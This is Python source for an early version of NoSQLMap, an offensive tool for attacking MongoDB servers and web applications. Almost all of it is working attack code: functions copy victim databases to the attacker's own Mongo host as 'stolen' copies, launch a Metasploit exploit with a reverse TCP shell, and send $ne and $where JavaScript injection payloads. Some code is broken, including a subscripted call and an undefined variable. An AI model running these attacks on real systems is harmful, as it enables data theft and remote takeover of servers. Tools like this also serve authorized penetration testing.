#!/usr/bin/python

import sys
import string
import random
import os
import httplib2
import urllib
import pymongo
from subprocess import call



def mainMenu():
	select = True
	while select:
		os.system('clear')
		print "NoSQLMap v0.06-by Russell Butturini(tcstool@gmail.com)"
		print "\n"
		print "1-Set options (do this first)"
		print "2-NoSQL DB Access Attacks"
		print "3-NoSQL Web App attacks"
		print "4-Exit"

		select = raw_input("Select an option:")

		if select == "1":
			options()

		elif select == "2":
			netAttacks(victim)
		
		elif select == "3":
			webApps()

		elif select == "4":
			sys.exit()
			
		else:
			raw_input("Invalid Selection.  Press enter to continue.")
			mainMenu()
			

def options():
	global victim
	global webPort
	global uri
	global httpMethod
	global myIP
	select = True
	
	while select:	
		print "\n\n"
		print "Options"
		print "1-Set target host/IP"
		print "2-Set web app port"
		print "3-Set URI Path"
		print "4-Set HTTP Request Method (GET/POST)"
		print "5-Set my local Mongo/Shell IP"
		print "6-Set shell listener port"
		print "7-Back to main menu"

		select = raw_input("Select an option: ")
		
		if select == "1":
			victim = raw_input("Enter the host IP/DNS name: ")
			print "Target set to " + victim + "\n"
			options()
			
		elif select == "2":
			webPort = raw_input("Enter the HTTP port for web apps: ")
			print "HTTP port set to " + webPort + "\n"
			options()

		elif select == "3":
			uri = raw_input("Enter URI Path (Press enter for no URI): ")
			print "URI Path set to " + uri + "\n"
			options()

		elif select == "4":
			httpMethod = True
			while httpMethod:

				print "1-Send request as a GET"
				print "2-Send request as a POST"
				httpMethod = raw_input("Select an option: ")
			
				if httpMethod == "1":
					print "GET request set"
					options()

				elif httpMethod == "2":
					print "POST request set"
					options()
				else:
					print "Invalid selection"

		elif select == "5":
			myIP = raw_input("Enter host IP for my Mongo/Shells: ")
			print "Shell IP set to " + myIP + "\n"
			options()
		
		elif select == "6":
			myPort = raw_input("Enter TCP listener for shells: ")
			print "Shell TCP listener set to " + myPort + "\n"
			options()
			
		elif select == "7":
			mainMenu()

def netAttacks(target):
	mgtOpen = False
	webOpen = False
	global dbList
	
	try:
		conn = pymongo.MongoClient(target,27017)
		print "MongoDB port open on " + target + ":27017!"
		mgtOpen = True
	
	except:
		print "MongoDB port closed."
		
		
	mgtUrl = "http://" + target + ":28017"
	mgtRespCode = urllib.urlopen(mgtUrl).getcode()
	
	try:	
		if mgtRespCode == 200:
			print "MongoDB web management open at " + mgtUrl + ".  Check this out!"
	
		else:
			print "Got HTTP " + mgtRespCode + "from " + mgtUrl + "."
	except:
		print "MongoDB web management closed."
	
	if mgtOpen == True:

		print "Server Info:"
		serverInfo = conn.server_info()
		print serverInfo

		print "\n"

		print "List of databases:"
		dbList = conn.database_names()
		print "\n".join(dbList)

		stealDB = raw_input("Steal a database? (Requires your own Mongo instance): ")
		
		if stealDB == "y" or stealDB == "Y":
			stealDBs (myIP)
			
		getShell = raw_input("Try to get a shell? (Requrires mongoDB <2.2.4)?")
		
		if getShell == "y" or getShell == "Y":
			try:
				call["msfcli","exploit/linux/misc/mongod_native_helper","RHOST=" + victim,"DB=local", "PAYLOAD=linux/x86/shell/reverse_tcp", "LHOST=" + myIP, "LPORT="+ myPort, "E" ]
			
			except:
				print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."
	
	raw_input("Press enter to continue...")
	return()
		
	
	
def webApps():
	paramName = []
	paramValue = []
	print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
	
	appURL = "http://" + str(victim) + ":" + str(webPort) + str(uri)
	appRespCode = urllib.urlopen(appURL).getcode()
	
	try:
		if appRespCode == 200:
			normLength = int(len(urllib.urlopen(appURL).read()))
			
			print "App is up! Got response length of " + str(normLength) + ".  Starting injection test.\n"
			appUp = True
		
		else:
			print "Got " + appRespCode + "from the app, check your options."
	except:
		print "Looks like the server didn't respond.  Check your options."
	
	if appUp == True:
			
		injectSize = raw_input("Baseline test-Enter random string size: ")
		injectString = randInjString(int(injectSize))
		print "Using " + injectString + " for injection testing.\n"
		
		randomUri = buildUri(appURL,injectString)
		print "Checking random injected parameter HTTP response size using " + randomUri +"...\n"
		randLength = int(len(urllib.urlopen(randomUri).read()))
		print "Got response length of " + str(randLength) + "."
		
		randNormDelta = abs(normLength - randLength)
		
		if randNormDelta == 0: 
			print "No change in response size injecting a random parameter..\n"
		else:
			print "HTTP response varied " + str(randNormDelta) + " bytes with random parameter!\n"
			
		print "Testing Mongo PHP not equals associative array injection using " + neqUri +"..."
		injLen = int(len(urllib.urlopen(neqUri).read()))
		print "Got response length of " + str(injLength) + "."
		
		randInjDelta = abs(injLen - randLength)
		
		if randInjDelta >= 100:
			print "Not equals injection respnose varied " + str(randInjDelta) + " bytes from random parameter! Injection works!"
		
		elif (randInjDelta > 0) and (randInjDelta < 100) :
			print "Response variance was only " + str(randInjDelta) + " bytes. Injection might have worked but difference is too small to be certain. "
		
		elif (randInjDelta == 0):
			print "Random string response size and not equals injection were the same. Injection did not work."	
		
		print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
		print " Injecting " + whereStrUri
		whereStrLen = int(len(urllib.urlopen(whereStrUri)))
		whereStrDelta = abs(whereStrLen - randLength)
		
		if whereStrDelta >= 100:
			print "Java $where escape varied " + str(whereStrDelta)  + " bytes from random parameter! Where injection works!"
		
		elif (whereStrDelta > 0) and (whereStrDelta < 100):
			print " response variance was only " + str(whereStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
		
		elif (whereStrDelta == 0):
			print "Random string response size and $where injection were the same. Injection did not work."
		
		print "\n"
		print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
		print " Injecting " + whereIntUri
		
		whereIntLen = int(len(urllib.urlopen(whereIntUri)))
		whereIntDelta = abs(whereIntLen - randLength)
		
		if whereIntDelta >= 100:
			print "Java $where escape varied " + str(whereIntDelta)  + " bytes from random parameter! Where injection works!"
		
		elif (whereIntDelta > 0) and (whereIntDelta < 100):
			print " response variance was only " + str(whereIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
		
		elif (whereIntDelta == 0):
			print "Random string response size and $where injection were the same. Injection did not work."
			
		#Start a single record attack
		
		print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
		print " Injecting " + whereOneStr
		whereOneStrLen = int(len(urllib.urlopen(whereOneStr)))
		whereOneStrDelta = abs(whereOneStrLen - randLength)
		
		if whereOneStrDelta >= 100:
			print "Java $where escape varied " + str(whereOneStrDelta)  + " bytes from random parameter! Where injection works!"
		
		elif (whereOneStrDelta > 0) and (whereOneStrDelta < 100):
			print " response variance was only " + str(whereOneStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
		
		elif (whereOneStrDelta == 0):
			print "Random string response size and $where single injection were the same. Injection did not work."
		
		print "\n"
		print "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
		print " Injecting " + whereOneInt
		
		whereOneIntLen = int(len(urllib.urlopen(whereOneInt)))
		whereOneIntDelta = abs(whereIntLen - randLength)
		
		if whereOneIntDelta >= 100:
			print "Java $where escape varied " + str(whereOneIntDelta)  + " bytes from random parameter! Where injection works!"
		
		elif (whereOneIntDelta > 0) and (whereOneIntDelta < 100):
			print " response variance was only " + str(whereOneIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
		
		elif (whereOneIntDelta == 0):
			print "Random string response size and $where single record injection were the same. Injection did not work."
			
		
		
		
		
		
		
	
	raw_input("Press enter to continue...")
	return()

def randInjString(size):
	chars = string.ascii_letters + string.digits
	return ''.join(random.choice(chars) for x in range(size))

def buildUri(origUri, randValue):
	paramName = []
	paramValue = []
	global neqUri
	global whereStrUri
	global whereIntUri
	global whereOneStr
	global whereOneInt
	
	split_uri = origUri.split("?")
	params = split_uri[1].split("&")
	
	for item in params:
		index = item.find("=")
		paramName.append(item[0:index])
		paramValue.append(item[index + 1:len(item)])
	print "List of parameters:"
	print "\n".join(paramName)
	
	injOpt = raw_input("Which parameter should we inject?")
	evilUri = split_uri[0] + "?"
	neqUri = split_uri[0] + "?"
	whereStrUri = split_uri[0] + "?"
	whereIntUri = split_uri[0] + "?"
	whereOneStr = split_uri[0] + "?"
	whereOneInt = split_uri[0] + "?"
	x = 0
	
	for item in paramName:		
		if paramName[x] == injOpt:
			evilUri += paramName[x] + "=" + randValue + "&"
			neqUri += paramName[x] + "[$ne]=" + randValue + "&"
			whereStrUri += paramName[x] + "'; return db.a.find(); var dummy= '!" + "&"
			whereIntUri += paramName[x] + "; return db.a.find();"
			whereOneStr += paramName[x] + "'; return db.a.findOne(); var dummy= '!" + "&"
			whereOneInt += paramName[x] + "; return db.a.findOne();" + "&"
		else:
			evilUri += paramName[x] + "=" + paramValue[x] + "&"
			neqUri += paramName[x] + "=" + paramValue[x] + "&"
			whereStrUri += paramName[x] + "=" + paramValue[x] + "&"
			whereIntUri += paramName[x] + "=" + paramValue[x] + "&"
			whereOneStr += paramName[x] + "=" + paramValue[x] + "&"
			whereOneInt += paramName[x] + "=" + paramValue[x] + "&"
			
			
	#Clip the last & off
	evilUri = evilUri[:-1]
	neqUri = neqUri[:-1]
	return evilUri

def stealDBs(myDB):
	menuItem = 1	
	
	for dbName in dbList:
		print str(menuItem) + "-" + dbName
		menuItem += 1
	
	try:
		dbLoot = raw_input("Select a database to steal:")
	
	except:
		print "Invalid selection."
		stealDBs(myDB)
		
	try:
		myDBConn = pymongo.MongoClient(myDB,27017)
		myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)	
		cloneAnother = raw_input("Database cloned.  Copy another?")
		
		if cloneAnother == "y" or cloneAnother == "Y":
			stealDBs(myDB)
		
		else:
			return()
	
	except:
		print "Something went wrong.  Are you sure your MongoDB is running?" , sys.exc_info()
		stealDBs(myDB)								
	
mainMenu()